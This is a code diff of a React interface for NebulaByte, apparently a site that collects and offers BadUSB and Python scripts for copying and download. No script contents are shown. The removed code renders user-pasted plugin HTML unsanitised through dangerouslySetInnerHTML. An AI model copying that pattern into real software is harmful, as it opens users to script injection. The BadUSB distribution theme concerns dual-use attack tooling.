-                            <i className="icon fas fa-home" onClick={() => handleSectionChange('home')}></i>
-                            <i className="icon fas fa-newspaper" onClick={() => handleSectionChange('news')}></i>
-                            <i className="icon fas fa-code" onClick={() => handleSectionChange('scripts')}></i>
-                            <i className="icon fas fa-history" onClick={() => handleSectionChange('history')}></i>
-                            <i className="icon fas fa-book" onClick={() => handleSectionChange('documentation')}></i>
-                            <i className="icon fas fa-puzzle-piece" onClick={() => handleSectionChange('plugins')}></i>
-                            <div className="bottom-icons">
-                                <i className="icon fas fa-user" onClick={() => handleSectionChange('profile')}></i>
-                                <i className="icon fas fa-cog" onClick={() => handleSectionChange('settings')}></i>
-                            </div>
-                        </div>
-                    </div>
-                    <div className="main-content">
-                        <div className={`content-section ${activeSection === 'home' ? 'active' : ''}`}>
-                            <h2>Welcome to {AppName}</h2>
-                            <div className="home-content">
-                                <div className="greeting">
-                                    <h3>{getGreeting()}, {settings.userName}!</h3>
-                                    <p>It's {currentTime.toLocaleTimeString()} on {currentTime.toLocaleDateString()}</p>
-                                </div>
-                                <div className="summary">
-                                    <h4>At a Glance</h4>
-                                    <p>Total Scripts: {badUSBScripts.length}</p>
-                                    <p>Recent Downloads: {downloadHistory.length}</p>
-                                </div>
-                                <div className="featured-script">
-                                    <h4>Featured Script</h4>
-                                    <BadUSBCard 
-                                        scriptName={badUSBScripts[0].name}
-                                        scriptContent={badUSBScripts[0].content}
-                                        category={badUSBScripts[0].category}
-                                        setDownloadHistory={setDownloadHistory}
-                                    />
-                                </div>
-                                <div className="quick-actions">
-                                    <h4>Quick Actions</h4>
-                                    <button onClick={() => handleSectionChange('scripts')}>Browse Scripts</button>
-                                    <button onClick={() => handleSectionChange('documentation')}>Read Docs</button>
-                                </div>
-                                <div className="news-ticker">
-                                    <h4>Latest Updates</h4>
-                                    <marquee>New security features added! | Check out our latest Prank scripts | Don't forget to update your devices</marquee>
+            const renderContent = () => {
+                switch(activeTab) {
+                    case 'home':
+                        return (
+                            <div className="home-content custom-scrollbar">
+                                <h1>Welcome to NebulaByte</h1>
+                                <p>Your comprehensive database for Python and BadUSB scripts.</p>
+                                
+                                <div className="home-grid">
+                                    <div className="news-section">
+                                        <h2>Latest News</h2>
+                                        <NewsItem 
+                                            title="New BadUSB Scripts Added" 
+                                            summary="Check out our latest collection of BadUSB scripts for penetration testing."
+                                        />
+                                        <NewsItem 
+                                            title="Python 3.10 Compatible Scripts" 
+                                            summary="All Python scripts have been updated to ensure compatibility with Python 3.10."
+                                        />
+                                        <NewsItem 
+                                            title="Community Spotlight" 
+                                            summary="Featured user-submitted scripts now available in our database."
+                                        />
+                                    </div>
+                                    
+                                    <div className="featured-scripts">
+                                        <h2>Featured Scripts</h2>
+                                        <RandomCode 
+                                            code={generateTestCode('python', Math.floor(Math.random() * 20) + 1)}
+                                            language="Python"
+                                        />
+                                        <RandomCode 
+                                            code={generateTestCode('badusb', Math.floor(Math.random() * 60) + 1)}
+                                            language="BadUSB"
+                                        />
+                                    </div>
                                 </div>
                             </div>
-                        </div>
-                        <div className={`content-section ${activeSection === 'news' ? 'active' : ''}`}>
-                            <h2>News</h2>
-                            <NewsContent />
-                        </div>
-                        <div className={`content-section ${activeSection === 'scripts' ? 'active' : ''}`}>
-                            <div className="search-and-filter">
+                        );
+                    case 'python':
+                    case 'badusb':
+                        return (
+                            <div className="code-database custom-scrollbar">
+                                <h2>{activeTab === 'python' ? 'Python' : 'BadUSB'} Scripts</h2>
                                 <input 
                                     type="text" 
                                     placeholder="Search scripts..." 
-                                    value={searchTerm} 
+                                    value={searchTerm}
                                     onChange={(e) => setSearchTerm(e.target.value)}
+                                    className="search-bar"
                                 />
-                                <select 
-                                    value={selectedCategory} 
-                                    onChange={(e) => setSelectedCategory(e.target.value)}
-                                >
-                                    {categories.map(category => (
-                                        <option key={category} value={category}>{category}</option>
+                                <div className="code-list">
+                                    {filteredSnippets(activeTab).map((snippet, index) => (
+                                        <CodeSnippet 
+                                            key={index}
+                                            snippet={snippet}
+                                            index={index}
+                                            copyToClipboard={copyToClipboard}
+                                            copiedIndex={copiedIndex}
+                                        />
                                     ))}
-                                </select>
+                                </div>
                             </div>
-                            <div className="badusb-grid">
-                                {filteredScripts.map((script, index) => (
-                                    <BadUSBCard 
-                                        key={index} 
-                                        scriptName={script.name} 
-                                        scriptContent={script.content} 
-                                        category={script.category}
-                                        setDownloadHistory={setDownloadHistory} 
-                                    />
-                                ))}
+                        );
+                    case 'search':
+                        return (
+                            <div className="search-content custom-scrollbar">
+                                <h2>Search</h2>
+                                <input 
+                                    type="text" 
+                                    placeholder="Search all scripts..." 
+                                    value={searchTerm}
+                                    onChange={(e) => setSearchTerm(e.target.value)}
+                                    className="search-bar"
+                                />
+                                <div className="code-list">
+                                    {[...filteredSnippets('python'), ...filteredSnippets('badusb')].map((snippet, index) => (
+                                        <CodeSnippet 
+                                            key={index}
+                                            snippet={snippet}
+                                            index={index}
+                                            copyToClipboard={copyToClipboard}
+                                            copiedIndex={copiedIndex}
+                                        />
+                                    ))}
+                                </div>
                             </div>
-                        </div>
-                        <div className={`content-section ${activeSection === 'history' ? 'active' : ''}`}>
-                            <HistorySection downloadHistory={downloadHistory} />
-                        </div>
-                        <div className={`content-section ${activeSection === 'documentation' ? 'active' : ''}`}>
-                            <h2>{AppName} Documentation</h2>
-                            <div className="documentation-content">
-                                <h3>Getting Started</h3>
-                                <p>Welcome to the {AppName} documentation. Here you'll find information on how to use our platform effectively.</p>
+                        );
+                    case 'profile':
+                        return (
+                            <div className="profile-content custom-scrollbar">
+                                <h2>User Profile</h2>
+                                <p>This is where user profile information would be displayed.</p>
+                            </div>
+                        );
+                    case 'settings':
+                        return (
+                            <Settings 
+                                currentTheme={currentTheme}
+                                changeTheme={changeTheme}
+                            />
+                        );
+                    default:
+                        return null;
+                }
+            };
 
-                                <h3>Using BadUSB Scripts</h3>
-                                <p>BadUSB scripts are powerful tools for automating USB-based tasks. Here's how to use them:</p>
-                                <ol>
-                                    <li>Browse the available scripts in the 'Scripts' section.</li>
-                                    <li>Click 'Copy' to copy the script to your clipboard.</li>
-                                    <li>Click 'Download' to save the script to your device.</li>
-                                </ol>
-
-                                <h3>Safety Precautions</h3>
-                                <p>Always exercise caution when using BadUSB scripts. Ensure you understand the script's functionality before executing it.</p>
-
-                                <h3>Troubleshooting</h3>
-                                <p>If you encounter any issues, please check our FAQ section or contact our support team.</p>
+            return (
+                <>
+                    <CustomCursor />
+                    <div className="app-container">
+                        <div className="sidebar">
+                            <div className="sidebar-icons">
+                                <i className={`icon fas fa-home ${activeTab === 'home' ? 'active' : ''}`} onClick={() => setActiveTab('home')}></i>
+                                <i className={`icon fab fa-python ${activeTab === 'python' ? 'active' : ''}`} onClick={() => setActiveTab('python')}></i>
+                                <i className={`icon fas fa-microchip ${activeTab === 'badusb' ? 'active' : ''}`} onClick={() => setActiveTab('badusb')}></i>
+                                <i className={`icon fas fa-search ${activeTab === 'search' ? 'active' : ''}`} onClick={() => setActiveTab('search')}></i>
+                                <div className="bottom-icons">
+                                    <i className={`icon fas fa-user ${activeTab === 'profile' ? 'active' : ''}`} onClick={() => setActiveTab('profile')}></i>
+                                    <i className={`icon fas fa-cog ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}></i>
+                                </div>
                             </div>
                         </div>
-                        <div className={`content-section ${activeSection === 'profile' ? 'active' : ''}`}>
-                            <ProfileSection />
-                        </div>
-                        <div className={`content-section ${activeSection === 'settings' ? 'active' : ''}`}>
-                            <h2>Settings</h2>
-                            <SettingsSection />
-                        </div>
-                        <div className={`content-section ${activeSection === 'plugins' ? 'active' : ''}`}>
-                            <h2>Plugins</h2>
-                            <div className="plugin-form">
-                                <textarea
-                                    placeholder="Paste your plugin HTML here..."
-                                    value={pluginHTML}
-                                    onChange={(e) => setPluginHTML(e.target.value)}
-                                ></textarea>
-                                <button onClick={addPlugin}>Add Plugin</button>
-                            </div>
-                            <div className="plugin-list">
-                                {plugins.map((plugin, index) => (
-                                    <div key={index} className="plugin-item">
-                                        <div dangerouslySetInnerHTML={{ __html: plugin }} />
-                                        <button onClick={() => removePlugin(index)}>Remove</button>
-                                    </div>
-                                ))}
-                            </div>
+                        <div className="main-content custom-scrollbar" ref={contentRef}>
+                            <SwitchTransition mode="out-in">
+                                <CSSTransition
+                                    key={activeTab}
+                                    classNames="fade"
+                                    timeout={500}
+                                    mountOnEnter
+                                    unmountOnExit
+                                >
+                                    {renderContent()}
+                                </CSSTransition>
+                            </SwitchTransition>
                         </div>
                     </div>
-                </div>
+                </>
             );
         };
 
